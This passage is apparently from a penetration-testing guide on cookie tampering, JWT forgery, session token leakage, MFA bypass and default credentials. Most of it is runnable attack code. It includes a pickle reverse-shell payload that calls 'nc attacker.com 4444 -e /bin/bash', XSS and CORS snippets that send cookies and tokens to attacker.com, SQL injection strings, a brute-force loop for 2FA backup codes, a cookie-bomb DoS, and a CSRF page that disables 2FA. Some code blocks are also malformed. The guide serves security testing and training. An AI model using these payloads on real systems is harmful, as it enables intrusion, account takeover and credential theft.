# - name = "user" (string length 4)
# - role = "member" (string length 6)

# Modified version
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:13:"administrator";}
```

**Python Pickle Cookies** [Unverified - high risk]

```python
import pickle
import base64

# Original cookie
cookie_b64 = "gAN9cQBYBAAAAHJvbGVxAVgEAAAAdXNlcnECcy4="
obj = pickle.loads(base64.b64decode(cookie_b64))
print(obj)  # {'role': 'user'}

# Modify
obj['role'] = 'admin'
malicious = base64.b64encode(pickle.dumps(obj)).decode()
print(malicious)
```

**JSON Cookie Manipulation**

```python
import json
import base64

# Decode JSON cookie
cookie = base64.b64decode("eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ1c2VyIn0=").decode()
data = json.loads(cookie)
print(data)  # {'user': 'test', 'role': 'user'}

# Modify
data['role'] = 'administrator'
data['permissions'] = ['read', 'write', 'delete']

# Re-encode
modified = base64.b64encode(json.dumps(data).encode()).decode()
print(modified)
```

### Cookie Signature Bypass

**Unsigned Cookie Exploitation**

```bash
# If application doesn't verify integrity
# Original: user_id=5
# Modified: user_id=1 (admin account)

curl -H "Cookie: user_id=1" https://target.com/dashboard
```

**Weak Signature Detection**

**Testing for Signature Validation**

```python
import requests

# Original cookie with signature
original_cookie = "user=test.a1b2c3d4e5f6"  # signature: a1b2c3d4e5f6

# Modify without changing signature
r1 = requests.get("https://target.com/", cookies={
    'session': 'user=admin.a1b2c3d4e5f6'  # Same signature
})

if r1.status_code == 200:
    print("[!] Signature not validated - modified data accepted")
else:
    print("[+] Signature validation appears active")

# Test signature removal
r2 = requests.get("https://target.com/", cookies={
    'session': 'user=admin'  # No signature
})

if r2.status_code == 200:
    print("[!] Signature optional - works without signature")
```

**Known-Plaintext Attack on Signatures**

[Inference] If signature is weak hash without salt:

```python
import hashlib

# If signature = MD5(cookie_value)
def test_weak_signature(cookie_value):
    md5_sig = hashlib.md5(cookie_value.encode()).hexdigest()
    sha1_sig = hashlib.sha1(cookie_value.encode()).hexdigest()
    
    # Test both
    test_cookie(f"{cookie_value}.{md5_sig}")
    test_cookie(f"{cookie_value}.{sha1_sig}")

# Example
test_weak_signature("user=admin&role=administrator")
```

**Hash Length Extension Attack**

[Unverified] For cookies signed with vulnerable hashing (MD5, SHA1, SHA256 without HMAC):

```bash
# Using hash_extender tool
hash_extender --data "user=test" \
              --secret-length 16 \
              --append "&role=admin" \
              --signature "original_signature_here" \
              --format md5

# Output includes modified data and new valid signature
```

### Cookie Injection Attacks

**HTTP Response Splitting (CRLF Injection)**

```bash
# Inject additional cookie via vulnerable parameter
curl "https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20admin=true"

# Results in response:
# Set-Cookie: admin=true
```

**Cookie Tossing (Subdomain Overwrite)**

```html
<!-- From attacker-controlled subdomain -->
<script>
// Overwrite parent domain cookie
document.cookie = "session=attacker_token; domain=.target.com; path=/";
</script>
```

**Cookie Smuggling via Path**

```bash
# Set cookie with specific path
curl -H "Cookie: auth=user_token; path=/app" https://target.com/app
curl -H "Cookie: auth=admin_token; path=/admin" https://target.com/admin

# Application may process both if path validation weak
```

### Mass Assignment via Cookie

[Inference] If application deserializes cookies into objects without filtering:

```bash
# Original cookie
{"username":"user","role":"member"}

# Add privileged properties
{"username":"user","role":"member","is_admin":true,"permissions":["all"]}

# Or modify constructor properties
{"username":"user","__proto__":{"isAdmin":true}}
```

### Cookie Bomb (Denial of Service)

[Unverified] Exploit cookie size limits:

```bash
# Send oversized cookie (servers typically limit 4KB)
curl -H "Cookie: bomb=$(python3 -c 'print("A"*10000)')" https://target.com

# Multiple cookies to exhaust limits
for i in {1..100}; do
    echo "Cookie$i: $(head -c 1000 /dev/urandom | base64)"
done > cookies.txt

curl -H @cookies.txt https://target.com
```

### Automated Cookie Analysis

**Burp Suite Cookie Manipulation**

```
1. Proxy â†’ HTTP History
2. Find Set-Cookie response
3. Right-click â†’ Send to Repeater
4. Decode cookie value (Inspector panel)
5. Modify decoded content
6. Re-encode and test
```

**Cookie Security Scanner**

```python
import requests
from urllib.parse import urlparse

def scan_cookie_security(url):
    r = requests.get(url)
    cookies = r.cookies
    
    for cookie in cookies:
        print(f"\n[+] Cookie: {cookie.name}")
        print(f"    Value: {cookie.value[:50]}...")
        
        # Check security flags
        if not cookie.secure:
            print("    [!] Missing Secure flag")
        if not cookie.has_nonstandard_attr('HttpOnly'):
            print("    [!] Missing HttpOnly flag")
        if not cookie.has_nonstandard_attr('SameSite'):
            print("    [!] Missing SameSite attribute")
        
        # Check domain scope
        if cookie.domain and cookie.domain.startswith('.'):
            print(f"    [!] Broad domain scope: {cookie.domain}")

    # Check expiration
    if cookie.expires:
        print(f"    [+] Expires: {cookie.expires}")
    else:
        print("    [*] Session cookie (no expiration)")
    
    # Attempt decode
    try_decode_cookie(cookie.value)

def try_decode_cookie(value): import base64 import json

# Try Base64
try:
    decoded = base64.b64decode(value).decode()
    print(f"    [+] Base64 decoded: {decoded[:100]}")
except:
    pass

# Try JSON
try:
    obj = json.loads(value)
    print(f"    [+] JSON structure: {obj}")
except:
    pass

# Try JWT
if value.count('.') == 2:
    parts = value.split('.')
    try:
        header = base64.b64decode(parts[0] + '==').decode()
        payload = base64.b64decode(parts[1] + '==').decode()
        print(f"    [+] JWT Header: {header}")
        print(f"    [+] JWT Payload: {payload}")
    except:
        pass

# Usage
scan_cookie_security("https://target.com")

**CookieMonster (Burp Extension)**

Features:

- Automatic cookie decoding
- Signature detection
- Integrity testing
- JWT manipulation
- Serialization detection
````

### Flask Session Cookie Manipulation

Flask uses signed session cookies that can be manipulated if the secret key is compromised.

**Decoding Flask Cookies**
```bash
# Install flask-unsign
pip3 install flask-unsign

# Decode cookie
flask-unsign --decode --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y8kZ7A.xyz123"

# Output: {'logged_in': True, 'username': 'test'}
````

**Brute Force Flask Secret Key**

```bash
# Wordlist-based attack
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt \
             --unsign \
             --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y8kZ7A.xyz123" \
             --no-literal-eval

# If secret found: [*] 'supersecret'
```

**Forge Modified Flask Cookie**

```bash
# Create malicious session
flask-unsign --sign \
             --cookie "{'logged_in': True, 'username': 'admin', 'is_admin': True}" \
             --secret 'supersecret'

# Output: New signed cookie
```

### Django Session Cookie Exploitation

Django uses Base64-encoded JSON with HMAC signature.

**Cookie Structure**

```
sessionid=<base64(data)>:<hmac_signature>
```

**Decoding Django Session**

```python
import base64
import json

cookie = "eyJ1c2VyX2lkIjoxLCJfYXV0aF91c2VyX2lkIjoiMSJ9:1rABCD:xyz123"
data, signature = cookie.split(':')

# Decode base64 component
decoded = base64.b64decode(data).decode()
session_data = json.loads(decoded)
print(session_data)
# {'user_id': 1, '_auth_user_id': '1'}
```

**Django Secret Key Exploitation**

[Inference] If `SECRET_KEY` leaked (via Git, error messages, etc.):

```python
from django.core import signing

# Forge session with known secret
SECRET_KEY = 'leaked_secret_key_value'
signer = signing.TimestampSigner(key=SECRET_KEY)

# Create malicious session data
session_data = {
    '_auth_user_id': '1',  # Admin user ID
    'user_id': 1,
    'is_superuser': True
}

# Sign and encode
import json
import base64
encoded = base64.b64encode(json.dumps(session_data).encode()).decode()
signed_cookie = signer.sign(encoded)
print(f"Malicious cookie: {signed_cookie}")
```

### JWT Cookie Exploitation

JSON Web Tokens in cookies present specific attack surfaces.

**JWT Structure**

```
header.payload.signature
```

**None Algorithm Attack**

```python
import base64
import json

# Original JWT header
header = {"alg": "HS256", "typ": "JWT"}

# Modified to "none"
header_modified = {"alg": "none", "typ": "JWT"}

# Payload with elevated privileges
payload = {
    "user": "admin",
    "role": "administrator",
    "exp": 9999999999
}

# Encode without signature
header_b64 = base64.urlsafe_b64encode(json.dumps(header_modified).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# Malicious JWT (note the trailing dot, no signature)
malicious_jwt = f"{header_b64}.{payload_b64}."
print(malicious_jwt)
```

**JWT Weak Secret Brute Force**

```bash
# Using jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat
# First, format JWT for hashcat
echo -n "eyJhbGc...header.payload.signature" > jwt.txt

# Crack with hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

**JWT Algorithm Confusion (RS256 to HS256)**

[Inference] If application uses RS256 (asymmetric) but accepts HS256 (symmetric):

```python
import jwt
import base64

# Obtain public key from /jwks.json or similar
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Decode original JWT
original_jwt = "eyJhbGc...signature"
decoded = jwt.decode(original_jwt, options={"verify_signature": False})

# Modify payload
decoded['role'] = 'admin'

# Sign with HS256 using public key as secret
malicious_jwt = jwt.encode(
    decoded,
    public_key,
    algorithm='HS256'
)

print(malicious_jwt)
```

**JWT Key Confusion (kid Parameter)**

```python
# If header includes "kid" (key ID)
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../dev/null"  # Path traversal
}

# Or SQL injection in kid
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "' UNION SELECT 'secret' -- "
}
```

**JWT Injection via jku/jwk**

```python
# Attacker-hosted JWK set
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "https://attacker.com/jwks.json"  # Attacker's keys
}

# Or embed malicious key directly
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": {
        "kty": "RSA",
        "n": "attacker_public_key_here",
        "e": "AQAB"
    }
}
```

### Cookie-Based SQL Injection

[Inference] If cookie values processed in SQL queries without sanitization:

```bash
# Original cookie
user_id=5

# SQL injection payload
user_id=5' OR '1'='1

# Advanced payload
user_id=5' UNION SELECT username,password FROM users WHERE '1'='1

# Blind SQL injection
user_id=5' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--
```

**Testing for SQL Injection in Cookies**

```python
import requests
import time

test_payloads = [
    "1' OR '1'='1",
    "1' AND SLEEP(5)--",
    "1' UNION SELECT NULL--",
    "1' AND 1=1--",
    "1' AND 1=2--"
]

for payload in test_payloads:
    start = time.time()
    r = requests.get("https://target.com/", cookies={'user_id': payload})
    elapsed = time.time() - start
    
    print(f"Payload: {payload}")
    print(f"Status: {r.status_code}")
    print(f"Time: {elapsed:.2f}s")
    
    if elapsed > 5:
        print("[!] Potential time-based SQLi detected")
    if "error" in r.text.lower():
        print("[!] SQL error message detected")
```

### Cookie-Based XSS

[Inference] If cookies reflected in page without encoding:

```bash
# XSS payload in cookie
document.cookie="username=<script>alert(document.domain)</script>";

# URL-encoded version
username=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

# Event handler payload
username=<img src=x onerror=alert(1)>

# Advanced exfiltration
username=<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

**Testing Reflected Cookie XSS**

```python
import requests

xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'-alert(1)-'",
    "\"><script>alert(1)</script>",
    "javascript:alert(1)"
]

for payload in xss_payloads:
    r = requests.get("https://target.com/profile", cookies={'name': payload})
    
    if payload in r.text:
        print(f"[!] Reflected without encoding: {payload}")
    elif payload.replace('<', '&lt;') in r.text:
        print(f"[*] HTML encoded: {payload}")
```

### Cookie Scope Exploitation

**Domain Attribute Manipulation**

[Inference] Testing cookie scope boundaries:

```javascript
// Set cookie for specific subdomain
document.cookie = "session=test1; domain=app.target.com";

// Set cookie for parent domain (if allowed)
document.cookie = "session=test2; domain=.target.com";

// No domain attribute (defaults to exact host)
document.cookie = "session=test3";

// Check which cookies sent to different subdomains
```

**Path Traversal in Cookie Path**

```javascript
// Narrow path
document.cookie = "auth=token1; path=/admin";

// Broader path overwrite
document.cookie = "auth=token2; path=/";

// Application may prefer one over the other
```

### Advanced Cookie Fuzzing

**Burp Intruder Cookie Fuzzing**

```
1. Capture request with cookie
2. Send to Intruder
3. Position markers:
   Cookie: session=Â§payloadÂ§
4. Payload sets:
   - Special characters: ' " < > ; = & |
   - SQL injection
   - XSS vectors
   - Path traversal: ../ ../../
   - Format strings: %s %x %n
   - Command injection: ; | & `
5. Analyze responses for anomalies
```

**Automated Cookie Fuzzing Script**

```python
import requests

fuzzing_payloads = {
    'sql': ["'", "' OR '1'='1", "1' UNION SELECT NULL--"],
    'xss': ["<script>alert(1)</script>", "javascript:alert(1)"],
    'path': ["../", "../../etc/passwd", "....//....//"],
    'command': [";ls", "|whoami", "`id`"],
    'format': ["%s%s%s", "%x%x%x", "%n%n%n"],
    'overflow': ["A"*1000, "A"*10000],
    'null': ["\x00", "%00", "\\0"],
    'unicode': ["\u0000", "\uffff", "\u202e"]
}

target = "https://target.com/profile"

for category, payloads in fuzzing_payloads.items():
    print(f"\n[*] Testing {category}")
    for payload in payloads:
        try:
            r = requests.get(target, cookies={'user': payload}, timeout=5)
            
            # Detection logic
            if r.status_code == 500:
                print(f"  [!] 500 Error: {payload[:50]}")
            elif "error" in r.text.lower():
                print(f"  [!] Error message: {payload[:50]}")
            elif len(r.text) < 100:
                print(f"  [!] Short response: {payload[:50]}")
        except Exception as e:
            print(f"  [!] Exception: {payload[:50]} - {e}")
```

### Cookie Deserialization Vulnerabilities

**PHP Object Injection**

[Unverified - high severity] If application uses `unserialize()` on cookie data:

```php
# Vulnerable code pattern:
$user_data = unserialize($_COOKIE['data']);

# Malicious cookie (depends on available gadget chains)
O:8:"UserData":1:{s:4:"role";s:5:"admin";}

# Advanced exploitation requires identifying magic methods
# __wakeup(), __destruct(), __toString() in application code
```

**Python Pickle RCE**

[Unverified - critical severity] If application uses `pickle.loads()` on cookies:

```python
import pickle
import base64
import os

# Malicious pickle payload (RCE)
class Exploit:
    def __reduce__(self):
        return (os.system, ('nc attacker.com 4444 -e /bin/bash',))

# Serialize and encode
malicious = base64.b64encode(pickle.dumps(Exploit())).decode()
print(f"Malicious cookie: {malicious}")

# When unserialized by vulnerable application, executes reverse shell
```

**Java Deserialization (Serialized Cookie)**

[Unverified] If Java application deserializes cookie data:

```bash
# Use ysoserial to generate exploit
java -jar ysoserial.jar CommonsCollections6 'nc attacker.com 4444 -e /bin/bash' | base64 -w 0

# Place in cookie header
Cookie: JSESSIONID=<base64_payload>
```

### Cookie Persistence Exploitation

**Long-Lived Session Tokens**

[Inference] If expiration not enforced server-side:

```bash
# Capture valid session cookie
# Check if still valid after:
# - 24 hours
# - Password change
# - Explicit logout
# - Account suspension

curl -H "Cookie: session=old_token" https://target.com/dashboard
```

**Session Fixation via Cookie Expiration**

```bash
# Set cookie with far-future expiration
curl -c cookies.txt https://target.com/
# Modify cookies.txt expiration to year 2099
curl -b cookies.txt https://target.com/login -d "user=victim&pass=pass"
# Session may persist indefinitely
```

### Cookie Security Testing Checklist

**Configuration Issues:**

- [ ] Secure flag missing (cookie sent over HTTP)
- [ ] HttpOnly flag missing (accessible via JavaScript)
- [ ] SameSite attribute missing (CSRF vulnerable)
- [ ] Overly broad domain scope
- [ ] Excessive expiration time

**Cryptographic Issues:**

- [ ] No signature/MAC
- [ ] Weak signature algorithm (MD5, SHA1)
- [ ] Predictable session IDs
- [ ] Reusable tokens across users

**Injection Vulnerabilities:**

- [ ] SQL injection in cookie values
- [ ] XSS via reflected cookies
- [ ] Command injection
- [ ] Path traversal
- [ ] LDAP/XML injection

**Logic Flaws:**

- [ ] Session fixation possible
- [ ] Token not invalidated on logout
- [ ] Privilege escalation via cookie modification
- [ ] Horizontal privilege escalation (user ID manipulation)

**Deserialization:**

- [ ] Unsafe deserialization (pickle, PHP serialize, Java)
- [ ] Object injection gadget chains
- [ ] Mass assignment vulnerabilities

### Comprehensive Cookie Testing Script

```python
#!/usr/bin/env python3

import requests
import base64
import json
import time
from urllib.parse import urlparse

class CookieTester:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        
    def test_all(self):
        print(f"\n[*] Testing {self.target}")
        
        # Get initial cookies
        r = self.session.get(self.target)
        cookies = r.cookies
        
        if not cookies:
            print("[!] No cookies set")
            return
        
        for cookie in cookies:
            print(f"\n{'='*60}")
            print(f"[+] Cookie: {cookie.name}")
            print(f"{'='*60}")
            
            self.test_security_flags(cookie)
            self.test_decoding(cookie.value)
            self.test_tampering(cookie.name, cookie.value)
            self.test_injection(cookie.name)
            self.test_scope(cookie)
    
    def test_security_flags(self, cookie):
        print("\n[*] Security Flags:")
        flags = []
        if cookie.secure:
            flags.append("Secure")
        else:
            print("  [!] Missing Secure flag")
        
        if cookie.has_nonstandard_attr('HttpOnly'):
            flags.append("HttpOnly")
        else:
            print("  [!] Missing HttpOnly flag")
        
        if cookie.has_nonstandard_attr('SameSite'):
            flags.append(f"SameSite={cookie.get_nonstandard_attr('SameSite')}")
        else:
            print("  [!] Missing SameSite attribute")
        
        if flags:
            print(f"  [+] Active flags: {', '.join(flags)}")
    
    def test_decoding(self, value):
        print("\n[*] Decoding Attempts:")
        
        # Base64
        try:
            decoded = base64.b64decode(value).decode()
            print(f"  [+] Base64: {decoded[:100]}")
            
            # Check if JSON
            try:
                obj = json.loads(decoded)
                print(f"  [+] JSON detected: {obj}")
            except:
                pass
        except:
            pass
        
        # JWT
        if value.count('.') == 2:
            try:
                parts = value.split('.')
                header = base64.urlsafe_b64decode(parts[0] + '==').decode()
                payload = base64.urlsafe_b64decode(parts[1] + '==').decode()
                print(f"  [+] JWT Header: {header}")
                print(f"  [+] JWT Payload: {payload}")
                print(f"  [*] Signature: {parts[2][:20]}...")
            except:
                pass
        
        # Hex
        try:
            decoded = bytes.fromhex(value).decode()
            print(f"  [+] Hex: {decoded}")
        except:
            pass
    
    def test_tampering(self, name, value):
        print("\n[*] Tampering Tests:")
        
        # Test modification
        tampered_values = [
            value + "X",  # Append
            "admin",  # Simple value
            "1",  # Numeric
            base64.b64encode(b"admin").decode(),  # Base64 admin
        ]
        
        for tampered in tampered_values:
            r = self.session.get(self.target, cookies={name: tampered})
            if r.status_code == 200:
                print(f"  [*] Accepted: {tampered[:50]}")
            elif r.status_code >= 500:
                print(f"  [!] Error with: {tampered[:50]}")
    
    def test_injection(self, name):
        print("\n[*] Injection Tests:")
        
        payloads = {
            'SQLi': "' OR '1'='1",
            'XSS': "<script>alert(1)</script>",
            'Path': "../../../etc/passwd",
            'Cmd': ";ls;",
        }
        
        for test_type, payload in payloads.items():
            r = self.session.get(self.target, cookies={name: payload})
            
            if "error" in r.text.lower():
                print(f"  [!] {test_type}: Error triggered")
            elif payload in r.text:
                print(f"  [!] {test_type}: Reflected without encoding")
    
    def test_scope(self, cookie):
        print("\n[*] Scope Analysis:")
        if cookie.domain:
            print(f"  Domain: {cookie.domain}")
            if cookie.domain.startswith('.'):
                print(f"  [!] Broad domain scope (all subdomains)")
        
        if cookie.path:
            print(f"  Path: {cookie.path}")

# Usage
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 cookie_tester.py <URL>")
        sys.exit(1)
    
    tester = CookieTester(sys.argv[1])
    tester.test_all()
```

---

## Recommended Related Topics

These advanced authentication topics extend the concepts covered:

- **OAuth 2.0 & OpenID Connect Attacks** - authorization framework vulnerabilities complementing SAML
- **Multi-Factor Authentication Bypass** - circumventing MFA implementations
- **Password Reset Token Analysis** - exploiting token generation weaknesses similar to session prediction
- **Cross-Site Request Forgery (CSRF)** - attacks leveraging session/cookie mechanics covered here

---

## Token Leakage

### Session Token Exposure Vectors

**1. URL Parameters**

Session tokens embedded in URLs leak through:

- Browser history
- Server logs (access.log)
- Referer headers to external sites
- Proxy logs
- Bookmarks/shared links

```bash
# Identify token in URL
http://target.com/dashboard?session=abc123def456

# Exploit: Share link, token stolen from logs
curl http://target.com/dashboard?session=STOLEN_TOKEN
```

**Testing:**

```bash
# Check if session persists in URL after login
burpsuite # Proxy â†’ HTTP history â†’ Filter: "session|token|auth"

# Automated URL token extraction
grep -Eo "(session|token|auth|key)=[a-zA-Z0-9]+" access.log
```

**2. Referer Header Leakage**

Tokens sent to third-party domains via Referer:

```http
GET /external-image.jpg HTTP/1.1
Host: attacker.com
Referer: https://target.com/page?token=SECRET_TOKEN
```

**Testing:**

```bash
# Set up listener
nc -lvnp 80

# Inject external resource
<img src="http://attacker.com/image.jpg">

# Monitor for Referer with token
```

**Mitigation Check:**

```bash
# Verify Referrer-Policy header
curl -I https://target.com | grep -i "referrer-policy"

# Should be: no-referrer or strict-origin-when-cross-origin
```

**3. Browser Storage Leakage**

**LocalStorage/SessionStorage:**

```javascript
// Vulnerable storage
localStorage.setItem('authToken', 'secret123');

// XSS extraction
<script>
fetch('http://attacker.com/?token=' + localStorage.getItem('authToken'));
</script>
```

**Testing:**

```bash
# Check browser storage (Browser DevTools)
# Console: localStorage, sessionStorage

# Automated check with headless browser
node <<EOF
const puppeteer = require('puppeteer');
(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto('http://target.com');
  const storage = await page.evaluate(() => ({
    local: Object.assign({}, localStorage),
    session: Object.assign({}, sessionStorage)
  }));
  console.log(storage);
  await browser.close();
})();
EOF
```

**4. Cookie Attribute Weaknesses**

```http
Set-Cookie: session=abc123
```

**Missing Security Flags:**

- No `HttpOnly` â†’ XSS can steal via `document.cookie`
- No `Secure` â†’ Transmitted over HTTP (MITM)
- No `SameSite` â†’ CSRF attacks possible
- `Domain=.example.com` â†’ Subdomain takeover risk

**Testing:**

```bash
# Extract cookie attributes
curl -i http://target.com/login -d "user=test&pass=test" | grep -i "set-cookie"

# Check for HttpOnly flag
curl -c cookies.txt http://target.com/login -d "user=admin&pass=pass"
cat cookies.txt | grep -v "^#"

# Expected output should show #HttpOnly prefix:
# #HttpOnly_target.com    FALSE   /   TRUE    0   session   abc123
```

**XSS Cookie Theft (when HttpOnly missing):**

```javascript
<script>
new Image().src='http://attacker.com/?c=' + document.cookie;
</script>
```

**5. JWT Token Leakage**

**Common JWT Storage Issues:**

```javascript
// Vulnerable: localStorage
localStorage.setItem('jwt', 'eyJhbGc...');

// Vulnerable: URL parameter
http://target.com/api?jwt=eyJhbGc...

// Less vulnerable: HttpOnly cookie
Set-Cookie: jwt=eyJhbGc...; HttpOnly; Secure; SameSite=Strict
```

**JWT Extraction:**

```bash
# Decode JWT (base64)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d

# Automated JWT analysis
python3 jwt_tool.py <JWT_TOKEN>

# Check for sensitive data in JWT
jwt_tool.py <TOKEN> -M at
```

**6. Authorization Header Logging**

```bash
# Dangerous: Logs expose Bearer tokens
2025-10-14 10:30:15 GET /api/users Authorization: Bearer eyJhbGc...
```

**Testing:**

```bash
# Request with auth header
curl -H "Authorization: Bearer TOKEN" http://target.com/api

# Check if token appears in error messages
curl -H "Authorization: Bearer TESTTOKEN123" http://target.com/nonexistent
```

**7. CORS Misconfiguration Token Leakage**

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Exploit:**

```html
<!-- attacker.com/steal.html -->
<script>
fetch('https://target.com/api/user', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('http://attacker.com/log?data=' + JSON.stringify(data)));
</script>
```

**Testing:**

```bash
# CORS misconfiguration check
curl -H "Origin: https://attacker.com" \
     -H "Access-Control-Request-Method: GET" \
     -H "Access-Control-Request-Headers: Authorization" \
     -X OPTIONS https://target.com/api

# Look for: Access-Control-Allow-Origin: https://attacker.com
```

**8. Postmessage Token Leakage**

```javascript
// Vulnerable postMessage
window.parent.postMessage({token: 'secret123'}, '*');

// Attacker iframe
window.addEventListener('message', (e) => {
  fetch('http://attacker.com/?token=' + e.data.token);
});
```

## Multi-Factor Authentication Bypasses

### 1. Response Manipulation

**Direct to Dashboard Bypass:**

```http
POST /verify-2fa HTTP/1.1
Content-Type: application/json

{"code": "123456"}
```

**Response:**

```json
{"success": false, "message": "Invalid code"}
```

**Exploit:** Modify response in Burp to:

```json
{"success": true, "redirect": "/dashboard"}
```

**Burp Suite Steps:**

```
1. Proxy â†’ Options â†’ Match and Replace
2. Add rule:
   - Type: Response body
   - Match: "success":false
   - Replace: "success":true
3. Submit wrong 2FA code
4. Check if authenticated
```

### 2. Status Code Manipulation

```http
HTTP/1.1 401 Unauthorized
{"authenticated": false}
```

**Burp Match/Replace:**

- Match: `401`
- Replace: `200`

### 3. Direct Request to Protected Resource

**Vulnerable Flow:**

```
1. POST /login (username/password) â†’ Session created
2. POST /verify-2fa (code) â†’ 2FA verification
3. GET /dashboard â†’ Access granted
```

**Bypass:** After step 1, directly request `/dashboard`

```bash
# Login to get session cookie
curl -c cookies.txt http://target.com/login -d "user=admin&pass=pass123"

# Skip 2FA, go directly to dashboard
curl -b cookies.txt http://target.com/dashboard

# If successful, 2FA is not enforced
```

### 4. Password Reset 2FA Bypass

**Flow:**

```
1. POST /forgot-password (email)
2. GET /reset-password?token=abc123
3. POST /set-new-password (no 2FA required)
```

**Exploit:**

```bash
# Reset password bypasses 2FA
curl http://target.com/forgot-password -d "email=victim@example.com"

# Check email for reset token (if accessible)
# Set new password without 2FA
curl http://target.com/set-new-password -d "token=abc123&password=newpass"

# Login with new password (2FA reset)
curl -c cookies.txt http://target.com/login -d "user=victim&pass=newpass"
```

### 5. Backup Codes Enumeration

```bash
# Brute force backup codes (if weak)
for code in $(seq 100000 999999); do
  curl -s http://target.com/verify-backup-code \
    -d "code=$code" \
    -b "session=abc123" | grep -q "success" && echo "Valid: $code"
done
```

**Rate Limiting Check:**

```bash
# Test if rate limiting exists
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    http://target.com/verify-2fa -d "code=000000"
done
```

### 6. Code Reuse

**Test if 2FA code can be reused:**

```bash
# Get valid code (timing-based or from victim)
CODE="123456"

# Use once
curl http://target.com/verify-2fa -d "code=$CODE" -b "session=abc"

# Try reusing
curl http://target.com/verify-2fa -d "code=$CODE" -b "session=abc"
```

### 7. Null/Empty Code Bypass

```bash
# Try bypasses
curl http://target.com/verify-2fa -d "code=" -b "session=abc"
curl http://target.com/verify-2fa -d "code=null" -b "session=abc"
curl http://target.com/verify-2fa -d "" -b "session=abc"
curl http://target.com/verify-2fa -b "session=abc" # No code parameter
```

### 8. Integer Overflow/Underflow

```bash
# Test boundary values
curl http://target.com/verify-2fa -d "code=999999999999999" -b "session=abc"
curl http://target.com/verify-2fa -d "code=-1" -b "session=abc"
curl http://target.com/verify-2fa -d "code=0" -b "session=abc"
```

### 9. CSRF on 2FA Disable

**If 2FA settings lack CSRF protection:**

```html
<html>
<body>
<form action="https://target.com/disable-2fa" method="POST" id="csrf">
  <input type="hidden" name="confirm" value="yes">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### 10. Referrer/Origin Check Bypass

**If 2FA checks Origin header:**

```bash
curl http://target.com/verify-2fa \
  -d "code=123456" \
  -H "Origin: https://target.com" \
  -b "session=abc"
```

### 11. Session Fixation on 2FA

```bash
# Set session before login
curl -c cookies.txt http://target.com --cookie "session=attacker_chosen_id"

# Victim logs in with this session (if vulnerable)
# Victim completes 2FA

# Attacker uses same session
curl -b cookies.txt http://target.com/dashboard
```

### 12. OAuth 2FA Bypass

**If OAuth doesn't enforce 2FA:**

```bash
# Login via OAuth (bypasses 2FA)
curl http://target.com/oauth/login?provider=google

# Redirects to Google, authenticates, returns to target.com
# Check if 2FA is skipped
```

### 13. Remember Device Bypass

```bash
# Capture "remember device" token
curl -c cookies.txt http://target.com/login -d "user=admin&pass=pass"
curl -b cookies.txt http://target.com/verify-2fa -d "code=123456&remember=true"

# Extract remember_device cookie
grep remember_device cookies.txt

# Use on different session
curl -b "remember_device=abc123" http://target.com/dashboard
```

### 14. Concurrent Session Bypass

```bash
# Start two sessions
curl -c cookies1.txt http://target.com/login -d "user=admin&pass=pass"
curl -c cookies2.txt http://target.com/login -d "user=admin&pass=pass"

# Complete 2FA on session 1
curl -b cookies1.txt http://target.com/verify-2fa -d "code=123456"

# Check if session 2 is also authenticated
curl -b cookies2.txt http://target.com/dashboard
```

## Default Credentials

### Common Default Credentials

**Admin Panels:**

```
admin:admin
admin:password
administrator:password
admin:admin123
root:root
root:toor
admin:12345
guest:guest
```

**Database Defaults:**

```
MySQL: root:(blank)
PostgreSQL: postgres:postgres
MongoDB: (no auth by default)
Redis: (no auth by default)
```

**Application Specific:**

```
Tomcat: tomcat:tomcat, admin:admin
Jenkins: admin:password
GitLab: root:5iveL!fe
WordPress: admin:password
phpMyAdmin: root:(blank)
```

### Enumeration Techniques

**1. Default Credential Lists:**

```bash
# SecLists default credentials
/usr/share/seclists/Passwords/Default-Credentials/

# Search for product-specific defaults
grep -i "tomcat" /usr/share/seclists/Passwords/Default-Credentials/*

# Online databases
# [Unverified] DefaultPassword.us, CIRT.net maintain default credential databases
```

**2. Automated Testing:**

```bash
# Hydra with default credentials
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  http-post-form "target.com:login.php:user=^USER^&pass=^PASS^:F=incorrect"

# Burp Intruder
# Load default credentials list
# Pitchfork attack (matches username:password pairs)
```

**3. Product Version Fingerprinting:**

```bash
# Identify software version
whatweb http://target.com

# Search for default credentials
searchsploit "Tomcat 9.0" | grep -i "default"

# Nmap service detection
nmap -sV -p 80,443,8080,8443 target.com
```

**4. Documentation Search:**

```bash
# Google dork for manuals
site:target.com filetype:pdf "default password"

# Search manufacturer docs
# [Inference] Look for setup guides, quick start manuals
```

### Persistence of Default Credentials

